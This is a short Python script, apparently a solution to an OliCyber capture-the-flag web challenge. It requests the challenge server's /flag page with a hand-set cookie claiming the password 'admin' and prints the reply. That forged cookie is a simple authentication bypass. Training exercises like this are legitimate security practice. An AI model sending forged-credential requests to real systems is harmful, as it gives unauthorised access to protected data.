import requests as rr

url = "http://web-05.challs.olicyber.it/flag"

cookie = {"password": "admin"}

r = rr.get(url, cookies = cookie)

print(r.text)

